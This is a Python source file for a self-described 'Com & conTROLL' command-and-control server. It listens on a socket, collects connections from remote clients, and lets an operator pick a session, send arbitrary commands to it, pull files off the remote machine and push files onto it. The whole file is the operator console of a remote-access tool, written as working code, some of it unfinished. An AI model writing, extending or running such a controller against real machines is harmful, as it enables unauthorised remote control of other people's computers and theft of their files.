from art import *
import socket
import threading
import sys
import time

connections = []

tprint("Com & conTROLL")

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 5151

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to host and port
server_socket.bind((SERVER_HOST, SERVER_PORT))

# Listen for incoming connections
server_socket.listen(5)
# print(f"Server listening on {SERVER_HOST}:{SERVER_PORT}")

def list():
    num = 0
    for connection in connections:
        print(f'\n[{num}]  {connection['address']}\n')
        num += 1 
    print("use number for interaction with socket. For example 'use 0'")  #MAKE HERE BEAUTIFUL

def help():
    print("list\nuse\nexit")

def use(session):
    session = int(session)
    if connections[session]:
        client_socket = connections[session]['socket']
        while 1:
            command = input(f"\n[*] You're interacting with {session} Enter command > ")
            client_socket.send(command.encode())
            command = command.split(" ")      
#################################################################      
            if command[0] == 'exit':                            #
                break                                           #
#################################################################
            match command[0]:
                case  'download':
                    download(from_=command[1], where=command[2], session=session)
                case 'upload':
                    upload(what=command[1], where=command[2], session=session)
                
    else:
        print("ID does not exist!")


def exit():
    server_socket.close()
    sys.exit()


def listen_incoming():
    while True:
        # Accept incoming connection
    
        client_socket, address = server_socket.accept()
        connection = {"address": address, 'socket': client_socket}
        connections.append(connection)
        
def download(from_, where, session):
    socket = connections[session]['socket']
    socket.send(from_.encode())
    time.sleep(0.3)
    file_name = from_.split('\\')[-1]
    if not where.endswith('\\'):
        where += '\\'
    where += file_name
    file = open(where, 'ab')
    a = socket.recv(4096)
    while a != b"\n\r":
        file.write(a)
        a = socket.recv(4096)
    file.close()
    print("File sent succesfully!")

def upload(what, where, session):
    socket = connections[session]['socket']
    socket.send(where.encode())
    time.sleep(0.3)
    file_name = what.split('\\')[-1]
    socket.send(file_name.encode())
    file = open(what, 'rb')
    a = file.read(4096)
    while a:
        socket.send(a)
        a = file.read(4096)
    time.sleep(0.3)
    socket.send(b"\n\r")
    file.close()

threading.Thread(target=listen_incoming).start()


while 1:
    command = input("\n[*] Enter command > ")
    
    command = command.split(" ")

    match command[0]:
        case "list":
            list()
        case "help":
            help()
        case  "download":
            pass
        case "shell":
            pass
        case 'exit':
            exit()
        case 'use':
            use(command[1])
            break

sys.exit()